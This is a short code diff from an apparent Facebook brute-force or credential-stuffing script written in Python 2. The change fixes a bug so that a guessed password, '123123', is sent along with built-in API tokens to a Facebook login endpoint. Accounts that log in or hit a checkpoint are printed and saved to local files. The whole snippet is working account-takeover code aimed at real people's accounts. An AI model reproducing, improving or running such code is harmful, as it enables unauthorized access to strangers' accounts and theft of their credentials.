@@ -279,21 +279,21 @@ def action():
                         cpb.append(c + user + pass3)
 			
 			
-			 pass4 = '123123'
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+		    pass4 = '123123'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
                         print '\x1b[1;92m [MAHDI-OK] ' + k + c + user + '  |  ' + pass4
                         okb = open('save/nikiok.txt', 'a')
-                        okb.write(k + c + user + pass3 + '\n')
+                        okb.write(k + c + user + pass4 + '\n')
                         okb.close()
-                        oks.append(c + user + pass3)
+                        oks.append(c + user + pass4)
                     elif 'www.facebook.com' in q['error_msg']:
                         print '\x1b[1;91m [MAHDI-CP] ' + k + c + user + '  |  ' + pass4
                         cps = open('save/nikicp.txt', 'a')
-                        cps.write(k + c + user + pass3 + '\n')
+                        cps.write(k + c + user + pass4 + '\n')
                         cps.close()
-                        cpb.append(c + user + pass3)
+                        cpb.append(c + user + pass4)
 			
         except:
             pass
